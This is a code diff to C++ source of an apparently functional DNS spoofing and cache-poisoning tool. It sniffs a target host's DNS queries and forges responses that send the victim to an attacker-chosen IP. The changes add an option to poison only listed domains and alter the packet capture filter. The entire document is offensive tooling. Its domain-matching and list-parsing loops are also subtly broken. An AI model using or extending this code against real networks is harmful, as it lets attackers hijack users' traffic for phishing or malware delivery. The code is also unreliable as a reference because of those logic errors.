@@ -32,7 +32,7 @@ void Program::Run()
     {
         isCapturing = true;
         std::unique_lock<std::mutex> lckg(mtx);
-        capturingEnded.wait(lckg, [this]{return !isCapturing;});
+        capturingEnded.wait(lckg, [this]{return !isCapturing;}); // Sleep until we have stopped capturing
     }
 
     if (!isCapturing)
@@ -50,8 +50,8 @@ void Program::OnPacketCapture(pcpp::RawPacket* packet, pcpp::PcapLiveDevice* dev
     pcpp::UdpLayer* udpLayer = parsedPacket.getLayerOfType<pcpp::UdpLayer>(); 
     pcpp::IPv4Layer* ipLayer = parsedPacket.getLayerOfType<pcpp::IPv4Layer>();
     pcpp::DnsLayer* dnsLayer = parsedPacket.getLayerOfType<pcpp::DnsLayer>();
-    
-    if(ipLayer->getSrcIPv4Address() != args.targetIP)
+
+    if(!dnsLayer) // the packet isn't a DNS one
         return;
 
     // Constructing the poisoned response
@@ -68,6 +68,17 @@ void Program::OnPacketCapture(pcpp::RawPacket* packet, pcpp::PcapLiveDevice* dev
 
     pcpp::DnsQuery* originalQuery = dnsLayer->getFirstQuery();
     std::string dnsQueryName = originalQuery->getName();
+
+    if (args.specificDomains)
+    {
+        bool domainMatch = false;
+        for (const std::string& domain : args.domains)
+            domainMatch = dnsQueryName.compare(domain) == 0; 
+
+        if (!domainMatch)
+            return;
+    }
+
     pcpp::DnsClass dnsClass = originalQuery->getDnsClass();
     pcpp::DnsType dnsType = originalQuery->getDnsType();
 
@@ -122,31 +133,50 @@ void Program::ParseArguments(int argc, char* argv[])
     parser.add_argument("-i", "--interface").required().help("Network Interface to use (takes an IP address or a name");
     parser.add_argument("-b", "--bad_ip").required().help("IP Address to inject into the cache. This shold be the address of the server you want to redirect the victim to");
     parser.add_argument("--ttl").default_value<uint32_t>(300).help("The time-to-live of the poisoned DNS record (specified in seconds). Defaults to 300s or 5min.").scan<'u', uint32_t>();
+    parser.add_argument("-d", "--domains").help("Specific domains to poison - enter them in a comma-separated list without spaces");
 
     std::vector<std::string> errors;
     try
     {
         parser.parse_args(argc, argv);
 
+        // parse bad IP
         args.hostAddress = pcpp::IPv4Address(parser.get("--bad_ip"));
         if (!args.hostAddress.isValid())
         {
             errors.push_back("Invalid malicious IP specified!");
         }
 
+        // parse interface
         args.interfaceAddress = pcpp::IPv4Address(parser.get("--interface"));
         if (!args.interfaceAddress.isValid())
         {
             args.interfaceName = parser.get("--interface"); // checking for a valid name is done later to keep the code cleaner
         }
 
+        // parse target IP
         args.targetIP = pcpp::IPv4Address(parser.get("--target"));
         if(!args.targetIP.isValid())
         {
             errors.push_back("Invalid target IP specified!");
         }
 
+        // parse TTL
         args.poisonTtl = parser.get<uint32_t>("--ttl");
+        
+        if(parser.is_used("--domains"))
+        {
+            args.specificDomains = true;
+            std::string domains = parser.get("--domains");
+
+            size_t pos = 0;
+            // Put the domains in a list
+            while ((pos = domains.find(",")) != std::string::npos) 
+            {
+                args.domains.push_back(domains.substr(0, pos));
+                domains.erase(0, pos + 1);
+            }
+        }
 
         if(errors.size() != 0)
         {
@@ -203,12 +233,8 @@ void Program::InitCaptureInterface()
 
     // Setup the filters
     pcpp::IPFilter ipFilter(args.targetIP.toString(), pcpp::SRC);
-    pcpp::ProtoFilter dnsFilter(pcpp::DNS);
-    pcpp::AndFilter combinedFilter;
 
-    combinedFilter.addFilter(&ipFilter);
-
-    if(!dev->setFilter(combinedFilter))
+    if(!dev->setFilter(ipFilter))
     {
         std::cerr << "Failed to setup capture filters." << std::endl;
         exit(0);
